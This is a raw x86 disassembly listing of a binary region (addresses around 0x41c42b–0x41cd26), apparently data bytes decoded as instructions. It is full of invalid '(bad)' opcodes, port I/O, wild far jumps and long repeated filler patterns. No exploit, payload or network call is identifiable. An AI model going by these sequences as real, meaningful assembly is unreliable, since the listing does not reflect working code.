  41c42b:	add    bl,al
  41c42d:	mov    esi,0xe31650d9
  41c432:	retf   0x21fd
  41c435:	jmp    0xb707c066
  41c43a:	rol    DWORD PTR [edi+0x5b7a687b],1
  41c440:	push   cs
  41c441:	stc    
  41c442:	sub    al,0xf4
  41c444:	mov    ch,0x3e
  41c446:	fadd   QWORD PTR [edi+0x5b7a8883]
  41c44c:	out    0x1b,al
  41c44e:	int3   
  41c44f:	je     0x41c4d0
  41c451:	test   BYTE PTR [esi+0x43],bh
  41c454:	out    0x53,al
  41c456:	fdivr  QWORD PTR [ecx]
  41c458:	xlat   BYTE PTR ds:[ebx]
  41c459:	lods   al,BYTE PTR ds:[esi]
  41c45a:	int3   
  41c45b:	push   0x412fd6
  41c460:	mov    ebx,0xd650d436
  41c465:	xchg   dl,cl
  41c467:	std    
  41c468:	mov    ecx,0xff74cc4b
  41c46d:	cmp    DWORD PTR [esi+0x43],0xffffff96
  41c471:	xor    ebx,esp
  41c473:	sbb    eax,0x89ccd4a7
  41c478:	sti    
  41c479:	out    dx,eax
  41c47a:	ja     0x41c4bf
	...
  41c4a4:	add    BYTE PTR [eax],al
  41c4a6:	mov    ?,edx
  41c4a8:	inc    ebp
  41c4a9:	cld    
  41c4aa:	mov    bh,0x5e
  41c4ac:	aam    0x89
  41c4ae:	jecxz  0x41c50a
  41c4b0:	pop    ebx
  41c4b1:	js     0x41c4b0
  41c4b3:	xor    BYTE PTR [eax+0x46],0x6a
  41c4b7:	jecxz  0x41c46d
  41c4b9:	fcmovnbe st,st(6)
  41c4bb:	repnz rol DWORD PTR [edx+0x3e],cl
  41c4bf:	loopne 0x41c46d
  41c4c1:	retf   
  41c4c2:	out    dx,al
  41c4c3:	add    BYTE PTR [eax-0x35],0x53
  41c4c7:	ins    DWORD PTR es:[edi],dx
  41c4c8:	mov    edi,0xe71bcd4b
  41c4cd:	jle    0x41c4cc
  41c4cf:	push   0xffffffb7
  41c4d1:	(bad)  [edi]
  41c4d3:	je     0x41c4f3
  41c4d5:	int3   
  41c4d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4d7:	repz fwait
  41c4d9:	inc    edx
  41c4da:	fisub  WORD PTR ds:[ebx+ebx*8-0x34db7c72]
  41c4e2:	sbb    ebp,DWORD PTR [ebp-0x6b]
  41c4e5:	jle    0x41c564
  41c4e7:	jae    0x41c480
  41c4e9:	fcmovnb st,st(2)
  41c4eb:	jae    0x41c4db
  41c4ed:	retf   
  41c4ee:	mov    ch,0x15
  41c4f0:	out    dx,eax
  41c4f1:	xor    eax,ebp
  41c4f3:	push   ss
  41c4f4:	xlat   BYTE PTR ds:[ebx]
  41c4f5:	xor    al,0xe6
  41c4f7:	in     al,0xce
  41c4f9:	retf   
  41c4fa:	jmp    0x41c4d4
  41c4fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4fd:	hlt    
  41c4fe:	mov    ebx,esi
  41c500:	sub    al,0xdc
  41c502:	outs   dx,BYTE PTR ds:[esi]
  41c503:	adc    DWORD PTR [ecx-0x34],0xffffffd3
  41c507:	ins    BYTE PTR es:[edi],dx
  41c508:	adc    eax,0x2f
	...
  41c531:	add    BYTE PTR [eax],al
  41c533:	add    cl,al
  41c535:	jg     0x41c543
  41c537:	(bad)  
  41c538:	ss pop ebx
  41c53a:	cmp    al,0x7d
  41c53c:	popf   
  41c53d:	fimul  DWORD PTR [ebx-0x18934e88]
  41c543:	adc    BYTE PTR ss:[edx+eiz*2],al
  41c547:	sub    DWORD PTR [esi],esi
  41c549:	loopne 0x41c547
  41c54b:	test   esp,0x93ca67d6
  41c551:	ins    BYTE PTR es:[edi],dx
  41c552:	add    BYTE PTR [ecx],bl
  41c554:	push   0x7
  41c556:	(bad)  
  41c557:	outs   dx,BYTE PTR ds:[esi]
  41c558:	jne    0x41c55b
  41c55a:	add    cl,dl
  41c55c:	test   eax,ebp
  41c55e:	ds jmp 0x573d39f9
  41c564:	jne    0x41c5a2
  41c566:	shl    BYTE PTR [ebx-0x48],cl
  41c569:	jae    0x41c5de
  41c56b:	test   al,0x3d
  41c56d:	jecxz  0x41c573
  41c56f:	sti    
  41c570:	sti    
  41c571:	fsqrt  
  41c573:	rol    DWORD PTR [ecx],1
  41c575:	jl     0x41c53c
  41c577:	fs repnz ins BYTE PTR es:[edi],dx
  41c57a:	std    
  41c57b:	es inc ebx
  41c57d:	pop    ebx
  41c57e:	add    cl,ch
  41c580:	adc    BYTE PTR [edi],al
  41c582:	xchg   DWORD PTR [ecx],ebx
  41c584:	stos   DWORD PTR es:[edi],eax
  41c585:	fdiv   DWORD PTR [edi+ecx*1-0xb]
  41c589:	ins    DWORD PTR es:[edi],dx
  41c58a:	das    
  41c58b:	sbb    edi,ecx
  41c58d:	sub    cl,BYTE PTR [ecx-0x292919c]
  41c593:	test   BYTE PTR [edx+0xef7cd8],0x0
	...
  41c5c2:	hlt    
  41c5c3:	ins    DWORD PTR es:[edi],dx
  41c5c4:	std    
  41c5c5:	ins    BYTE PTR es:[edi],dx
  41c5c6:	mov    DWORD PTR [ebp-0x3],ebp
  41c5c9:	fidiv  WORD PTR [eax-0x20]
  41c5cc:	jl     0x41c5a5
  41c5ce:	hlt    
  41c5cf:	ins    DWORD PTR es:[edi],dx
  41c5d0:	or     eax,0xe0da388f
  41c5d5:	inc    esi
  41c5d6:	pop    ecx
  41c5d7:	mov    al,0x7c
  41c5d9:	mov    edi,0x7f0d6e04
  41c5de:	xor    al,0x3c
  41c5e0:	clc    
  41c5e1:	popa   
  41c5e2:	cmp    dl,BYTE PTR [ebp+0x1900e901]
  41c5e8:	and    DWORD PTR [ebx+0x6902f0a5],0xa7735b38
  41c5f2:	outs   dx,DWORD PTR ds:[esi]
  41c5f3:	add    eax,0xa14700e8
  41c5f8:	sti    
  41c5f9:	jmp    DWORD PTR [ebx+edi*4]
  41c5fc:	js     0x41c5fc
  41c5fe:	adc    BYTE PTR [ecx+0x57cc8000],ah
  41c604:	jno    0x41c5ad
  41c606:	in     al,0xe2
  41c608:	js     0x41c608
  41c60a:	adc    BYTE PTR [ecx-0xd0e8b00],ah
  41c610:	add    BYTE PTR [eax+0x50fba0f1],0xef
  41c617:	mov    eax,ds:0x4110fff9
  41c61c:	pop    esi
  41c61d:	pop    ebx
  41c61e:	fiadd  WORD PTR [ebx+0x575fc259]
  41c624:	push   ecx
  41c625:	mov    DWORD PTR [eax],eax
	...
  41c64f:	add    BYTE PTR [edx+0x2e],cl
  41c652:	push   eax
  41c653:	push   ebx
  41c654:	jmp    0x9c4a1742
  41c659:	xor    ecx,DWORD PTR [ebx+ecx*4]
  41c65c:	retf   0x2e6e
  41c65f:	leave  
  41c660:	lea    ebp,[edx+0xe]
  41c663:	mov    bl,bl
  41c665:	arpl   bp,si
  41c667:	mov    bl,BYTE PTR [ebx]
  41c669:	jo     0x41c5f0
  41c66b:	add    al,0xee
  41c66d:	pop    ds
  41c66e:	jg     0x41c669
  41c670:	out    dx,eax
  41c671:	and    ch,cl
  41c673:	push   ebx
  41c674:	xor    eax,0x10faac87
  41c679:	xchg   ebp,eax
  41c67a:	sub    eax,0x176382d2
  41c67f:	mov    ch,bl
  41c681:	push   eax
  41c682:	xor    al,BYTE PTR [ecx]
  41c684:	dec    edi
  41c685:	pop    esi
  41c686:	inc    edx
  41c687:	or     DWORD PTR [ebp-0x390f8699],0xffffffb0
  41c68e:	mov    al,BYTE PTR [edx+edi*4-0x6a]
  41c692:	mov    BYTE PTR [edx*4+0x3efa7f20],al
  41c699:	jl     0x41c6e0
  41c69b:	icebp  
  41c69c:	add    BYTE PTR ds:0xb5fbec79,ch
  41c6a2:	clc    
  41c6a3:	call   DWORD PTR [ecx+0x3e000174]
  41c6a9:	je     0x41c6ac
  41c6ab:	add    BYTE PTR [esi],bh
  41c6ad:	je     0x41c6b0
  41c6af:	add    BYTE PTR [esi],bh
  41c6b1:	je     0x41c6b4
	...
  41c6db:	add    BYTE PTR [eax],al
  41c6dd:	add    BYTE PTR [esi],bh
  41c6df:	je     0x41c6e2
  41c6e1:	add    BYTE PTR [esi],bh
  41c6e3:	je     0x41c6e6
  41c6e5:	add    BYTE PTR [esi],bh
  41c6e7:	je     0x41c6ea
  41c6e9:	add    BYTE PTR [esi],bh
  41c6eb:	je     0x41c6ee
  41c6ed:	add    BYTE PTR [esi],bh
  41c6ef:	je     0x41c6f2
  41c6f1:	add    BYTE PTR [esi],bh
  41c6f3:	je     0x41c6f6
  41c6f5:	add    BYTE PTR [esi],bh
  41c6f7:	je     0x41c6fa
  41c6f9:	add    BYTE PTR [esi],bh
  41c6fb:	je     0x41c6fe
  41c6fd:	add    BYTE PTR [esi],bh
  41c6ff:	je     0x41c702
  41c701:	add    BYTE PTR [esi],bh
  41c703:	je     0x41c706
  41c705:	add    BYTE PTR [esi],bh
  41c707:	je     0x41c70a
  41c709:	add    BYTE PTR [esi],bh
  41c70b:	je     0x41c70e
  41c70d:	add    BYTE PTR [esi],bh
  41c70f:	je     0x41c712
  41c711:	add    BYTE PTR [esi],bh
  41c713:	je     0x41c716
  41c715:	add    BYTE PTR [esi],bh
  41c717:	je     0x41c71a
  41c719:	add    BYTE PTR [esi],bh
  41c71b:	je     0x41c71e
  41c71d:	add    BYTE PTR [esi],bh
  41c71f:	je     0x41c722
  41c721:	add    BYTE PTR [esi],bh
  41c723:	je     0x41c726
  41c725:	add    BYTE PTR [esi],bh
  41c727:	je     0x41c72a
  41c729:	add    BYTE PTR [esi],bh
  41c72b:	je     0x41c72e
  41c72d:	add    BYTE PTR [esi],bh
  41c72f:	je     0x41c732
  41c731:	add    BYTE PTR [esi],bh
  41c733:	je     0x41c736
  41c735:	add    BYTE PTR [esi],bh
  41c737:	je     0x41c73a
  41c739:	add    BYTE PTR [esi],bh
  41c73b:	pop    ebx
  41c73c:	out    0x3,eax
  41c73e:	ds pop ebx
  41c740:	out    0x3,eax
	...
  41c76a:	add    BYTE PTR [eax],al
  41c76c:	ds pop ebx
  41c76e:	out    0x3,eax
  41c770:	ds pop ebx
  41c772:	out    0x3,eax
  41c774:	ds pop ebx
  41c776:	out    0x3,eax
  41c778:	ds pop ebx
  41c77a:	out    0x3,eax
  41c77c:	ds pop ebx
  41c77e:	out    0x3,eax
  41c780:	ds pop ebx
  41c782:	out    0x3,eax
  41c784:	ds pop ebx
  41c786:	out    0x3,eax
  41c788:	ds pop ebx
  41c78a:	out    0x3,eax
  41c78c:	ds pop ebx
  41c78e:	out    0x3,eax
  41c790:	ds pop ebx
  41c792:	out    0x3,eax
  41c794:	ds pop ebx
  41c796:	out    0x3,eax
  41c798:	ds pop ebx
  41c79a:	out    0x3,eax
  41c79c:	ds pop ebx
  41c79e:	out    0x3,eax
  41c7a0:	ds pop ebx
  41c7a2:	out    0x3,eax
  41c7a4:	ds pop ebx
  41c7a6:	out    0x3,eax
  41c7a8:	ds pop ebx
  41c7aa:	out    0x3,eax
  41c7ac:	ds pop ebx
  41c7ae:	in     al,0xfd
  41c7b0:	xor    al,0x55
  41c7b2:	mov    BYTE PTR [ebx],dh
  41c7b4:	mov    dh,dl
  41c7b6:	mov    BYTE PTR [ebx],ah
  41c7b8:	mov    BYTE PTR [edx],ch
  41c7ba:	int    0x13
  41c7bc:	pop    ecx
  41c7bd:	cmp    eax,edi
  41c7bf:	push   ss
  41c7c0:	pop    esi
  41c7c1:	cmp    esi,DWORD PTR [ebx+0x5b]
  41c7c4:	pop    ebp
  41c7c5:	cmp    ebx,DWORD PTR [edx+0x59]
  41c7c8:	xchg   ecx,eax
  41c7c9:	test   DWORD PTR [edx+0x61],0x5c5b3b6c
	...
  41c7f8:	add    BYTE PTR [eax],al
  41c7fa:	pop    ebp
  41c7fb:	cmp    ecx,DWORD PTR [ecx+0x61]
  41c7fe:	push   edx
  41c7ff:	out    dx,eax
  41c800:	dec    ebx
  41c801:	push   edx
  41c802:	push   ds
  41c803:	and    eax,0x1c37f910
  41c808:	add    BYTE PTR [esi+0x6a],al
  41c80b:	lock jno 0x41c84e
  41c80e:	sbb    ebx,esi
  41c810:	jae    0x41c7db
  41c812:	push   ebp
  41c813:	cli    
  41c814:	es leave 
  41c816:	push   edx
  41c817:	xor    BYTE PTR [edi],dh
  41c819:	rol    DWORD PTR [esi+0x2d],1
  41c81c:	xor    cl,bl
  41c81e:	dec    edx
  41c81f:	cmp    esp,DWORD PTR [edx+0x0]
  41c822:	pop    edx
  41c823:	adc    eax,0xfdec046d
  41c828:	bound  eax,QWORD PTR [edi]
  41c82a:	pop    edx
  41c82b:	and    BYTE PTR [edx-0x6],ah
  41c82e:	fdivp  st(0),st
  41c830:	sub    ecx,DWORD PTR [ecx]
  41c832:	sti    
  41c833:	imul   BYTE PTR [ebx+0x9]
  41c836:	sub    al,0x0
  41c838:	gs shl ecx,0xe9
  41c83c:	pop    ds
  41c83d:	mov    ebx,0xbb62e9de
  41c842:	add    edi,esp
  41c844:	arpl   WORD PTR [edi],cx
  41c846:	inc    edi
  41c847:	push   edx
  41c848:	or     esp,ebx
  41c84a:	push   es
  41c84b:	div    BYTE PTR [ecx-0x3c]
  41c84e:	pop    ebp
  41c84f:	add    BYTE PTR [esi-0x71],ch
  41c852:	mov    ch,ch
  41c854:	push   0xffffff88
  41c856:	jns    0x41c858
  41c858:	ins    DWORD PTR es:[edi],dx
  41c859:	xchg   DWORD PTR [edi],esi
  41c85b:	cmp    ebp,DWORD PTR [eax-0x6b]
	...
  41c886:	add    BYTE PTR [eax],al
  41c888:	mov    ebx,ebp
  41c88a:	cmp    esi,edx
  41c88c:	sub    dh,ch
  41c88e:	je     0x41c906
  41c890:	xor    eax,DWORD PTR [eax]
  41c892:	bound  edi,QWORD PTR [edx-0x62]
  41c895:	stc    
  41c896:	jo     0x41c916
  41c898:	fwait
  41c899:	out    dx,eax
  41c89a:	je     0x41c8e4
  41c89c:	mov    esp,?
  41c89e:	sub    eax,0x2cf4914a
  41c8a3:	in     al,0xe7
  41c8a5:	push   esp
  41c8a6:	or     ch,cl
  41c8a8:	cmp    eax,0xe700005b
  41c8ad:	pop    ebx
  41c8ae:	add    BYTE PTR [eax],al
  41c8b0:	xlat   BYTE PTR ds:[ebx]
  41c8b1:	pop    ebx
  41c8b2:	add    BYTE PTR [eax],al
  41c8b4:	xlat   BYTE PTR ds:[ebx]
  41c8b5:	pop    ebx
  41c8b6:	add    BYTE PTR [eax],al
  41c8b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8b9:	pop    ebx
  41c8ba:	add    BYTE PTR [eax],al
  41c8bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8bd:	pop    ebx
  41c8be:	add    BYTE PTR [eax],al
  41c8c0:	xchg   edi,eax
  41c8c1:	pop    ebx
  41c8c2:	add    BYTE PTR [eax],al
  41c8c4:	xchg   edi,eax
  41c8c5:	pop    ebx
  41c8c6:	add    BYTE PTR [eax],al
  41c8c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8c9:	pop    ebx
  41c8ca:	add    BYTE PTR [eax],al
  41c8cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8cd:	pop    ebx
  41c8ce:	add    BYTE PTR [eax],al
  41c8d0:	xchg   edi,eax
  41c8d1:	pop    ebx
  41c8d2:	add    BYTE PTR [eax],al
  41c8d4:	xchg   edi,eax
  41c8d5:	pop    ebx
  41c8d6:	add    BYTE PTR [eax],al
  41c8d8:	addr16 pop ebx
  41c8da:	add    BYTE PTR [eax],al
  41c8dc:	addr16 pop ebx
  41c8de:	add    BYTE PTR [eax],al
  41c8e0:	push   edi
  41c8e1:	pop    ebx
  41c8e2:	add    BYTE PTR [eax],al
  41c8e4:	retf   0x4ed8
  41c8e7:	imul   esp,DWORD PTR [esi],0x3b
  41c8ea:	sub    DWORD PTR [eax+eax*1],eax
	...
  41c915:	add    BYTE PTR [ecx],dl
  41c917:	mov    dh,0x54
  41c919:	in     al,dx
  41c91a:	sub    bh,BYTE PTR [edx-0x2587d29e]
  41c920:	pop    es
  41c921:	push   edi
  41c922:	cmp    ah,BYTE PTR [ebp+0x5]
  41c925:	adc    ebx,esp
  41c927:	ins    DWORD PTR es:[edi],dx
  41c928:	gs in  al,0xef
  41c92b:	adc    al,0x4f
  41c92d:	mov    ss,WORD PTR [edi]
  41c92f:	pop    ebx
  41c930:	add    BYTE PTR [eax],al
  41c932:	daa    
  41c933:	pop    ebx
  41c934:	add    BYTE PTR [eax],al
  41c936:	daa    
  41c937:	pop    ebx
  41c938:	add    BYTE PTR [eax],al
  41c93a:	pop    ss
  41c93b:	pop    ebx
  41c93c:	add    BYTE PTR [eax],al
  41c93e:	pop    ss
  41c93f:	pop    ebx
  41c940:	add    BYTE PTR [eax],al
  41c942:	out    0x5a,eax
  41c944:	add    BYTE PTR [eax],al
  41c946:	out    0x5a,eax
  41c948:	add    BYTE PTR [eax],al
  41c94a:	xlat   BYTE PTR ds:[ebx]
  41c94b:	pop    edx
  41c94c:	add    BYTE PTR [eax],al
  41c94e:	ds je  0x41c952
  41c951:	add    BYTE PTR [esi],bh
  41c953:	je     0x41c956
  41c955:	add    BYTE PTR [esi],bh
  41c957:	je     0x41c95a
  41c959:	add    BYTE PTR [esi],bh
  41c95b:	je     0x41c95e
  41c95d:	add    BYTE PTR [esi],bh
  41c95f:	je     0x41c962
  41c961:	add    BYTE PTR [esi],bh
  41c963:	je     0x41c966
  41c965:	add    BYTE PTR [esi],bh
  41c967:	je     0x41c96a
  41c969:	add    BYTE PTR [esi],bh
  41c96b:	je     0x41c96e
  41c96d:	add    BYTE PTR [esi],bh
  41c96f:	je     0x41c972
  41c971:	add    BYTE PTR [esi],bh
  41c973:	je     0x41c976
  41c975:	add    BYTE PTR [esi],bh
  41c977:	je     0x41c97a
	...
  41c9a1:	add    BYTE PTR [eax],al
  41c9a3:	add    BYTE PTR [esi],bh
  41c9a5:	je     0x41c9a8
  41c9a7:	add    BYTE PTR [esi],bh
  41c9a9:	je     0x41c9ac
  41c9ab:	add    BYTE PTR [esi],bh
  41c9ad:	je     0x41c9b0
  41c9af:	add    BYTE PTR [esi],bh
  41c9b1:	je     0x41c9b4
  41c9b3:	add    BYTE PTR [esi],bh
  41c9b5:	je     0x41c9b8
  41c9b7:	add    BYTE PTR [esi],bh
  41c9b9:	je     0x41c9bc
  41c9bb:	add    BYTE PTR [esi],bh
  41c9bd:	je     0x41c9c0
  41c9bf:	add    BYTE PTR [esi],bh
  41c9c1:	je     0x41c9c4
  41c9c3:	add    BYTE PTR [esi],bh
  41c9c5:	je     0x41c9c8
  41c9c7:	add    BYTE PTR [esi],bh
  41c9c9:	je     0x41c9cc
  41c9cb:	add    BYTE PTR [esi],bh
  41c9cd:	je     0x41c9d0
  41c9cf:	add    BYTE PTR [esi],bh
  41c9d1:	je     0x41c9d4
  41c9d3:	add    BYTE PTR [esi],bh
  41c9d5:	je     0x41c9d8
  41c9d7:	add    BYTE PTR [esi],bh
  41c9d9:	je     0x41c9dc
  41c9db:	add    BYTE PTR [esi],bh
  41c9dd:	je     0x41c9e0
  41c9df:	add    BYTE PTR [esi],bh
  41c9e1:	je     0x41c9e4
  41c9e3:	add    BYTE PTR [esi],bh
  41c9e5:	je     0x41c9e8
  41c9e7:	add    BYTE PTR [esi],bh
  41c9e9:	je     0x41c9ec
  41c9eb:	add    BYTE PTR [esi],bh
  41c9ed:	je     0x41c9f0
  41c9ef:	add    BYTE PTR [esi],bh
  41c9f1:	pop    ebx
  41c9f2:	out    0x3,eax
  41c9f4:	ds pop ebx
  41c9f6:	out    0x3,eax
  41c9f8:	ds pop ebx
  41c9fa:	out    0x3,eax
  41c9fc:	ds pop ebx
  41c9fe:	out    0x3,eax
  41ca00:	ds pop ebx
  41ca02:	out    0x3,eax
  41ca04:	ds pop ebx
  41ca06:	out    0x3,eax
	...
  41ca30:	add    BYTE PTR [eax],al
  41ca32:	ds pop ebx
  41ca34:	out    0x3,eax
  41ca36:	ds pop ebx
  41ca38:	out    0x3,eax
  41ca3a:	ds pop ebx
  41ca3c:	out    0x3,eax
  41ca3e:	ds pop ebx
  41ca40:	out    0x3,eax
  41ca42:	ds pop ebx
  41ca44:	out    0x3,eax
  41ca46:	ds pop ebx
  41ca48:	out    0x3,eax
  41ca4a:	ds pop ebx
  41ca4c:	out    0x3,eax
  41ca4e:	ds pop ebx
  41ca50:	out    0x3,eax
  41ca52:	ds pop ebx
  41ca54:	out    0x3,eax
  41ca56:	ds pop ebx
  41ca58:	out    0x3,eax
  41ca5a:	ds pop ebx
  41ca5c:	out    0x3,eax
  41ca5e:	ds pop ebx
  41ca60:	out    0x3,eax
  41ca62:	ds pop ebx
  41ca64:	out    0x3,eax
  41ca66:	ds pop ebx
  41ca68:	out    0x3,eax
  41ca6a:	ds pop ebx
  41ca6c:	out    0x3,eax
  41ca6e:	ds pop ebx
  41ca70:	out    0x3,eax
  41ca72:	ds pop ebx
  41ca74:	out    0x3,eax
  41ca76:	ds pop ebx
  41ca78:	out    0x3,eax
  41ca7a:	ds pop ebx
  41ca7c:	out    0x3,eax
  41ca7e:	ds pop ebx
  41ca80:	out    0x3,eax
  41ca82:	ds pop ebx
  41ca84:	fcom   DWORD PTR [ecx]
  41ca86:	dec    edi
  41ca87:	das    
  41ca88:	aam    0xd
  41ca8a:	ds jmp 0x41ca14
  41ca8d:	push   eax
  41ca8e:	(bad)  
  41ca8f:	in     al,dx
  41ca90:	lea    edx,[ecx-0x66]
  41ca93:	pop    ebx
  41ca94:	add    BYTE PTR [ecx+0x0],bh
	...
  41cabf:	add    BYTE PTR [ebp+0x3d8b61eb],dl
  41cac5:	hlt    
  41cac6:	je     0x41cb14
  41cac8:	xor    bh,ch
  41caca:	jbe    0x41cab5
  41cacc:	jmp    0x6764:0xd71d312a
  41cad3:	inc    esp
  41cad4:	or     eax,ebp
  41cad6:	jo     0x41cac1
  41cad8:	shr    BYTE PTR [edx],cl
  41cada:	xor    ebp,esi
  41cadc:	(bad)  
  41cadd:	cs xor eax,0x32343df1
  41cae3:	cli    
  41cae4:	test   eax,0x610b6064
  41cae9:	xor    al,0x32
  41caeb:	fidivr DWORD PTR ds:0x4f1d62f7
  41caf1:	clc    
  41caf2:	data16 (bad) 
  41caf4:	cmp    eax,0x51fa62ef
  41caf9:	pop    ebx
  41cafa:	ins    BYTE PTR es:[edi],dx
  41cafb:	push   cs
  41cafc:	inc    esp
  41cafd:	clc    
  41cafe:	push   DWORD PTR [edi-0x6ffd48d]
  41cb04:	sbb    ch,dl
  41cb06:	jo     0x41cae6
  41cb08:	sub    al,0xe9
  41cb0a:	arpl   WORD PTR [eax],bx
  41cb0c:	cmp    dh,bl
  41cb0e:	(bad)  
  41cb0f:	lds    ebp,FWORD PTR [ecx]
  41cb11:	idiv   bh
  41cb13:	mov    ebx,0xcc68f50c
  41cb18:	or     bl,BYTE PTR [ebx+0x64]
  41cb1b:	mov    ebx,0xc76cfe1a
  41cb20:	cmp    eax,0xb471ef
	...
  41cb4d:	add    BYTE PTR [eax-0x11],ch
  41cb50:	ins    DWORD PTR es:[edi],dx
  41cb51:	xchg   esi,eax
  41cb52:	xor    ah,BYTE PTR [eax+esi*1-0x28]
  41cb56:	sub    dh,BYTE PTR ds:0xfc3dd82f
  41cb5c:	imul   edi,DWORD PTR [esi+0x57],0xfffffff8
  41cb60:	jbe    0x41cb62
  41cb62:	mov    al,0x22
  41cb64:	add    BYTE PTR [ecx],dh
  41cb66:	lds    ebp,FWORD PTR [ecx+esi*1+0x35]
  41cb6a:	mov    ecx,0xbf72fd60
  41cb6f:	ds outs dx,DWORD PTR fs:[esi]
  41cb72:	mov    BYTE PTR [edi+0x2d],bl
  41cb75:	xor    al,BYTE PTR [ebx+eiz*2+0x32]
  41cb79:	cmp    BYTE PTR ss:[edi+0x36],ah
  41cb7d:	add    BYTE PTR [edi+esi*1+0x23046972],al
  41cb84:	add    BYTE PTR [ebx+0xa],dh
  41cb87:	sub    DWORD PTR [edi+0x68],ebp
  41cb8a:	(bad)  
  41cb8b:	sub    BYTE PTR [ecx+0x0],ah
  41cb8e:	jb     0x41cbce
  41cb90:	outs   dx,DWORD PTR ds:[esi]
  41cb91:	je     0x41cbcd
  41cb93:	sub    eax,0x2a306300
  41cb98:	jo     0x41cc0f
  41cb9a:	cmp    esi,DWORD PTR [edx]
  41cb9c:	jb     0x41cb9e
  41cb9e:	aaa    
  41cb9f:	sub    eax,0x32346e65
  41cba4:	outs   dx,DWORD PTR ds:[esi]
  41cba5:	jae    0x41cb3e
  41cba7:	sub    esp,DWORD PTR [ebp+0x67]
  41cbaa:	dec    eax
  41cbab:	xor    dh,BYTE PTR [edx+0x0]
  41cbae:	cmp    DWORD PTR [eax],ebp
  41cbb0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x0
	...
  41cbd9:	add    BYTE PTR [eax],al
  41cbdb:	add    BYTE PTR [ebp+0x3e],dh
  41cbde:	ins    BYTE PTR es:[edi],dx
  41cbdf:	ins    BYTE PTR es:[edi],dx
  41cbe0:	push   edi
  41cbe1:	outs   dx,BYTE PTR ds:[esi]
  41cbe3:	mov    dh,BYTE PTR [bp+di]
  41cbe6:	add    BYTE PTR [edx+0x7a],ch
  41cbe9:	sub    al,0x71
  41cbeb:	jae    0x41cc33
  41cbed:	push   edi
  41cbee:	sub    eax,0x2f6e4432
  41cbf3:	xor    esp,DWORD PTR [edi]
  41cbf5:	es push 0x7633eb61
  41cbfb:	lds    ebx,FWORD PTR gs:[esi+0x66]
  41cbff:	jb     0x41cbbb
  41cc01:	xor    esp,DWORD PTR [edi+ebp*2+0x3e]
  41cc05:	xlat   BYTE PTR ds:[ebx]
  41cc06:	add    DWORD PTR [ecx-0x59],ebp
  41cc09:	loopne 0x41cc37
  41cc0b:	arpl   WORD PTR [esp+esi*2-0x25658edc],cx
  41cc12:	add    DWORD PTR [ecx+0x69],esi
  41cc15:	aad    0x26
  41cc17:	arpl   WORD PTR [esp+esi*2+0x36],bp
  41cc1b:	jae    0x41cc8b
  41cc1d:	(bad)  
  41cc1f:	imul   ebx,DWORD PTR [edi+0x12],0x4
  41cc23:	imul   esp,DWORD PTR [edi+0x15],0x2c
  41cc27:	pop    edi
  41cc28:	pop    ebx
  41cc29:	and    BYTE PTR [ecx+eiz*2],al
  41cc2c:	push   esi
  41cc2d:	(bad)  
  41cc2f:	jno    0x41cc8c
  41cc31:	je     0x41cc5d
  41cc33:	outs   dx,BYTE PTR ds:[esi]
  41cc34:	xor    cl,BYTE PTR [edi]
  41cc36:	outs   dx,BYTE PTR ss:[esi]
  41cc38:	sbb    ebp,DWORD PTR [eax]
  41cc3a:	add    al,0x6a
  41cc3c:	sbb    DWORD PTR [ebp+0x2c],eax
  41cc3f:	jae    0x41cc41
	...
  41cc69:	add    BYTE PTR [edi],bl
  41cc6b:	je     0x41cc94
  41cc6d:	jae    0x41cc8c
  41cc6f:	pop    ebp
  41cc70:	cmp    DWORD PTR [ebp+0xb],ebp
  41cc73:	je     0x41cc98
  41cc75:	ins    BYTE PTR es:[edi],dx
  41cc76:	and    esp,DWORD PTR [ebp+0x34]
  41cc79:	arpl   WORD PTR [edx],bx
  41cc7b:	je     0x41cca0
  41cc7d:	pop    edi
  41cc7e:	in     eax,dx
  41cc7f:	dec    esi
  41cc80:	es pop edi
  41cc82:	loop   0x41cce3
  41cc84:	add    DWORD PTR [ecx-0xe],esi
  41cc87:	xchg   edx,eax
  41cc88:	xor    esi,DWORD PTR [ebp-0x21]
  41cc8b:	test   DWORD PTR [eax+eax*1],esi
  41cc8e:	push   cs
  41cc8f:	inc    esp
  41cc90:	hlt    
  41cc91:	das    
  41cc92:	push   cs
  41cc93:	inc    esp
  41cc94:	add    al,0x70
  41cc96:	shl    DWORD PTR [ebp+0x73db6c31],cl
  41cc9c:	sub    ebp,DWORD PTR [ebp-0x54]
  41cc9f:	nop
  41cca0:	and    ch,BYTE PTR [esi+0x3e]
  41cca3:	call   0x38f:0x5bb26722
  41ccaa:	scas   eax,DWORD PTR es:[edi]
  41ccab:	call   0xeddefb3b
  41ccb0:	out    0x22,al
  41ccb2:	(bad)  
  41ccb3:	repz jp 0x41ccdc
  41ccb6:	xchg   ecx,eax
  41ccb7:	pop    ebx
  41ccb8:	mov    DWORD PTR [esi],esi
  41ccba:	(bad)  
  41ccbb:	out    0x83,eax
  41ccbd:	xor    eax,0x228bf33e
  41ccc2:	push   0x6e037cf8
  41ccc7:	clc    
  41ccc8:	push   esi
  41ccc9:	xor    al,0x5d
  41cccb:	in     eax,dx
  41cccc:	out    0xf8,al
	...
  41ccf6:	add    BYTE PTR [eax],al
  41ccf8:	adc    ch,BYTE PTR [edx]
  41ccfa:	push   ds
  41ccfb:	stc    
  41ccfc:	or     ch,BYTE PTR [edx]
  41ccfe:	out    0x2b,eax
  41cd00:	dec    ebp
  41cd01:	icebp  
  41cd02:	cmp    ah,BYTE PTR [edi]
  41cd04:	dec    esp
  41cd05:	pop    ebx
  41cd06:	dec    ebx
  41cd07:	xor    DWORD PTR [eax],esi
  41cd09:	clc    
  41cd0a:	inc    edx
  41cd0b:	cmp    edi,DWORD PTR [esi]
  41cd0d:	cld    
  41cd0e:	cmp    al,0x28
  41cd10:	sub    al,0xf8
  41cd12:	sbb    eax,0xdf32a04
  41cd17:	das    
  41cd18:	stc    
  41cd19:	in     eax,dx
  41cd1a:	out    0x22,al
  41cd1c:	and    dl,bh
  41cd1e:	add    esi,DWORD PTR [eax]
  41cd20:	cvtdq2ps xmm1,XMMWORD PTR [edx]
  41cd23:	sub    al,0xe1
  41cd25:	in     al,dx
  41cd26:	or     ch,BYTE PTR [ebx]
